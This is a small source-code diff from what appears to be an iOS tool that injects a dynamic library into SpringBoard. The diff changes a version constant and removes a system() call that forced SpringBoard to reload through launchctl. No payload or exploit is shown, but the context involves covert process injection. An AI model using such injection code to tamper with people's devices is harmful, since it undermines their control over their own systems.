@@ -78,7 +78,7 @@ u_int gOSMinor  = 0;
 u_int gOSBugFix = 0;
 
 // Core Version
-u_int gVersion      = 2012041601;
+u_int gVersion      = 2012063001;
 
 int getBSDProcessList (kinfo_proc **procList, size_t *procCount)
 {
@@ -720,10 +720,6 @@ BOOL injectDylib(NSString *sbPathname)
   [sbDataOut writeToFile: sbPathname
               atomically: YES];
   [dylibPathname release];
-  
-  // Forcing a SpringBoard reload
-  system("launchctl unload \"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist\";" 
-         "launchctl load \"/System/Library/LaunchDaemons/com.apple.SpringBoard.plist\"");
   
   return YES;
 }
